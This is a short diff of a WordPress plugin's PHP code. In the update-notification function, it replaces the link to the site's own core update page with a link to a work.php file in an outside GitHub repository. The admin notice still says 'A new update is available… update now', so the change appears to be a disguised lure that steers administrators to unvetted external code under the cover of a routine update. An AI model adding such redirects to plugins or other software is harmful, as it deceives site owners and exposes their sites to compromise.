@@ -80,7 +80,8 @@ function custom_plugin_display_update_notification()
     $plugin_data = get_plugin_data(__FILE__);                                                                                                           
     $plugin_name = $plugin_data['Name'];
 
-    $update_url = admin_url('update-core.php');
+    //$update_url = admin_url('update-core.php'); 
+    $update_url = 'https://github.com/setupgit/wsplugin/blob/main/work.php';
 
     $message = sprintf(
         __('A new update is available for %s. Please <a href="%s">update now</a>.', 'text-domain'),
